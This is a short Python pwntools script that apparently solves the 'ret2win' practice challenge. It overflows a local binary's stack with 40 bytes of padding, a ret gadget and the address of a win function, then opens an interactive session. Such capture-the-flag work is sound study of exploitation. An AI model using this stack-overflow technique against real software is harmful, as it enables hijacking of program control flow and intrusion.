#!/usr/bin/env python3

"""Exploiting ret2win

Simple version of script

Usage: $ python3 simple_ret2win.py
"""

import sys

from pwn import *

p = process("./ret2win")

payload = b"a" * 40  # overflow
payload += p64(0x40053e) # ret for padding
payload += p64(0x400756)  # ret2win address

p.sendline(payload)
p.interactive()
